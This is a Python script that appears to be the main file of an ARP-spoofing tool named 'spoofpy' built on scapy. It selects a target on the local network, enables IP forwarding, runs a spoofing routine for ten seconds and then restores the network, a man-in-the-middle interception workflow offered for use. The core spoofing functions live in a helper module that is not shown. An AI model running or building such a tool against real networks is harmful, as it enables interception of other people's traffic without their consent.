from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys
import helpers, ui

def spoofpy():
    # print the welcome message
    ui.welcome()

    # get network information
    network_info = helpers.get_network()

    # print the network information
    ui.print_network_info(network_info)

    # get the targets
    target_ip = ui.gather_targets(network_info['ip_range'])

    target = helpers.gather_target_info(target_ip[0])

    print(f"[*] Target IP: {target['ip'], target['mac']}")


    # enable IP forwarding
    helpers.enable_ip_route()


    # start the spoofing attack
    helpers.spoof(target['ip'], network_info['ip'])

    # wait for 10 seconds
    time.sleep(10)

    # restore the network
    helpers.restore(target['ip'], network_info['ip'])

    # disable IP forwarding
    helpers.disable_ip_route()


if __name__ == "__main__":
    spoofpy()




